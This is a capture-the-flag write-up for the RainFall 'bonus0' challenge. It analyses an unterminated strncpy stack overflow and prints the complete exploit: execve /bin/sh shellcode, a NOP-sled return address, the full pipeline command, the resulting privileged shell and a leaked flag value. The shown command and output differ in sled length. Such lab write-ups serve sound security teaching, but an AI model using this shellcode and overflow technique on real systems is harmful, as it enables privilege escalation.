# Bonus0 Write-up: Exploiting Non-Null Terminated Buffers & "Ghost" Stack Memory

## Part 1: Input Management & Assembly Analysis

To understand how to exploit `./bonus0`, we first need to break down how the program manages user input across its three main functions: `main`, `pp`, and `p`.

### 1. The `main` Function

The `main` function simply allocates a 42-byte buffer on the stack (from `esp+0x16` to `esp+0x40`) and passes it to `pp()`. After `pp()` finishes, it prints the buffer using `puts()`.

### 2. The `pp` Function (The Core Logic)

This function manages the strings. It allocates space for two 20-byte buffers (`buf1` at `ebp-0x30` and `buf2` at `ebp-0x1c`) and calls `p()` twice to fill them.

```assembly
0x0804852e <+16>:    lea    eax,[ebp-0x30]  ; buf1
0x08048531 <+19>:    mov    DWORD PTR [esp],eax
0x08048534 <+22>:    call   0x80484b4 <p>
...
0x08048541 <+35>:    lea    eax,[ebp-0x1c]  ; buf2
0x08048544 <+38>:    mov    DWORD PTR [esp],eax
0x08048547 <+41>:    call   0x80484b4 <p>

```

After filling the buffers, it concatenates them into the `result` buffer passed from `main`:

1. `strcpy(result, buf1)`
2. Appends a separator (like `" - "`) using inline string scanning.
3. `strcat(result, buf2)`

### 3. The `p` Function (The Input Reader)

This is where the magic—and the vulnerability—happens. Look at the memory allocation and the read size:

```assembly
0x080484b7 <+3>:     sub    esp,0x1018             ; Allocates 4120 bytes!
...
0x080484d0 <+28>:    lea    eax,[ebp-0x1008]       ; Start of large buffer
0x080484e1 <+45>:    call   0x8048380 <read@plt>   ; Reads 0x1000 (4096) bytes
...
0x08048517 <+99>:    call   0x80483f0 <strncpy@plt> ; Copies ONLY 20 bytes

```

* It grabs up to **4096 bytes** of input into a massive stack buffer.
* It replaces the newline (`\n`) with a null byte (`\0`) using `strchr`.
* It uses `strncpy` to copy **only 20 bytes** into the destination buffer (`buf1` or `buf2`).

**The Vulnerability:** By definition, if `strncpy` copies 20 bytes from a source that is 20 bytes or longer, **it does not append a null terminator**. When `pp()` later calls `strcpy` and `strcat`, it will read past the 20 bytes until it hits random stack garbage, causing a massive buffer overflow that overwrites the Instruction Pointer (EIP).

Using a cyclic pattern (`Aa0AAa1AAa2AAa3AAa4A`), we confirmed the EIP overwrite occurs exactly at **offset 9** of `buf2`.

---

## Part 2: The Exploit Strategy (The "Ghost Buffer" Method)

### The Problem: Environment Shifts

Initially, we tried splitting the shellcode perfectly between `buf1` and `buf2`. While this worked perfectly inside GDB, it failed natively (Segmentation Fault / SIGFPE).

The issue was the **Environment Shift**. The binary executes as `bonus1` (SUID), while our GDB runs under the `users` group. Even when using `env -i`, differences in execution paths (`argv[0]`) shifted the native stack by 20 to 50 bytes. Because our `buf1` + `buf2` space was so tight, we could only fit a 5-byte NOP sled, meaning our target address missed the shellcode natively.

### The Solution: Exploiting the 4096-Byte Footprint

We reviewed the `p()` function and realized something huge: `p()` reads up to 4096 bytes into the stack (`0xbfffe680`). Even though `strncpy` only copies 20 bytes into `buf1`, **the rest of our massive payload remains sitting untouched on the stack.**

Instead of fighting for space in the 42-byte `result` buffer, we can use the "Ghost Buffer" left behind by `p()`:

1. **Buffer 1 Payload:** Send a massive 500-byte NOP sled followed by the shellcode. `strncpy` takes the first 20 NOPs, but the rest of the 500 NOPs and the shellcode stay perfectly intact in the deep stack memory.
2. **Buffer 2 Payload:** Send 9 bytes of padding to reach the EIP offset, followed by our target return address, pointing directly into the middle of that massive Ghost Buffer.

### Calculating the Target Address

* Using GDB, we found the start of the `p()` buffer is at `0xbfffe680`.
* Because environment variables might shift this address slightly, we don't want to point at the very beginning.
* We chose an address safely inside our 500-byte NOP sled: `0xbfffe680 + 264 bytes = 0xbfffe788`.
* In little-endian, this is `\x88\xe7\xff\xbf`.

---

## Part 3: Execution & Payload

We construct the final payload using a bash subshell and a `sleep 0.1` delay. The delay forces the pipeline to flush, ensuring the first `read()` grabs exactly our first payload, and the second `read()` grabs our second payload.

**Buffer 1 (NOP Sled + Shellcode):**

```python
python2 -c 'print "\x90"*500 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xb0\x0b\xcd\x80"'

```

**Buffer 2 (EIP Overwrite at offset 9):**

```python
python2 -c 'print "s"*9 + "\x88\xe7\xff\xbf" + "a1AAa1A"'

```

**The Final Command:**

```bash
bonus0@RainFall:~$ (python2 -c 'print "\x90"*500+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xb0\x0b\xcd\x80"'; sleep 0.1; python2 -c 'print "s"*9+"\x88\xe7\xff\xbfa1AAa1A"'; cat) | ./bonus0 

```

**Result:**

```text
bonus0@RainFall:~$ (python2 -c 'print "\x90"*216+"\x31\xc0\x50\x68\x2
f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xb0\x0b\xcd
\x80"'; sleep 0.1;python2 -c 'print "s"*9+"\x88\xe7\xff\xbfa1AAa1A"';
 cat) | ./bonus0 
 - 
 - 
��������������������sssssssss����a1AAa1A��� sssssssss����a1AAa1A���
whoami
bonus1
cat /home/user/bonus1/.pass 
cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9

```

By leveraging the leftover memory of the `read()` buffer, we created a 500-byte landing zone that completely absorbed the environment shift, securing the shell on the first try.